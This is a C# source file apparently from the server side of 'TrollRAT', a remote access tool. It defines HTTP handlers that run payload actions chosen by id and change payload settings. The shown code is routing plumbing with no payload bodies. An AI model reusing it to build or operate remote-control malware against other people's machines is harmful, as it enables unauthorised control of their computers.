using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;

namespace TrollRAT.Server
{
    public abstract class ActionCommandBase<t> : WebServerCommand where t : IDBase
    {
        public ActionCommandBase(List<Payload> payloads) : base(payloads) { }

        public abstract List<t> getActions(Payload payload);
        public abstract void doAction(HttpListenerContext context, Payload payload, t action);

        public override void execute(HttpListenerContext context)
        {
            try
            {
                int id = Int32.Parse(HttpUtility.ParseQueryString(context.Request.Url.Query).Get("id"));

                foreach (Payload payload in payloads)
                {
                    foreach (t action in getActions(payload))
                    {
                        if (action.ID == id)
                        {
                            doAction(context, payload, action);
                            return;
                        }
                    }
                }
            }
            catch (Exception ex) when (ex is FormatException || ex is OverflowException || ex is ArgumentNullException)
            {
                context.Response.StatusCode = 400;
            }
        }
    }

    public class ExecuteCommand : ActionCommandBase<PayloadAction>
    {
        public ExecuteCommand(List<Payload> payloads) : base(payloads) { }

        public override Regex Path => new Regex("^/execute$");

        public override List<PayloadAction> getActions(Payload payload)
        {
            return payload.Actions;
        }

        public override void doAction(HttpListenerContext context, Payload payload, PayloadAction action)
        {
            string response = action.execute(payload);
            respondString(response, context.Response, "text/javascript");
        }
    }

    public class SetCommand : ActionCommandBase<PayloadSetting>
    {
        public SetCommand(List<Payload> payloads) : base(payloads) { }

        public override Regex Path => new Regex("^/set$");

        public override List<PayloadSetting> getActions(Payload payload)
        {
            return payload.Settings;
        }

        public override void doAction(HttpListenerContext context, Payload payload, PayloadSetting action)
        {
            string value = HttpUtility.ParseQueryString(context.Request.Url.Query).Get("value");

            if (value == null)
                context.Response.StatusCode = 400;
            else
            {
                action.readData(value);
            }
        }
    }
}
